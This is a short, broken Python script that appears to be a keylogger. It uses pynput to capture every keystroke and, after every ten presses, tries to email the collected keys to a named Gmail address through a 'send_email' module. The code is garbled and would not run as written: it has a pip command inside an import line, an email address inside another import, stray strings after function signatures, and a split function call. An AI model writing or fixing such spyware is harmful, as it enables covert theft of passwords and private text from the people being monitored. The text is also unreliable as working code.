import pynput,pip install pynput
from pynput.keyboard import Key, Listener
import send_email Sustalord@gmail.com

count = 0
keys = [8]

def on_press(key):"alt"
    print(key, end= "alt ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):"Enter"
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.
    (message)

def on_release(key):alt
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
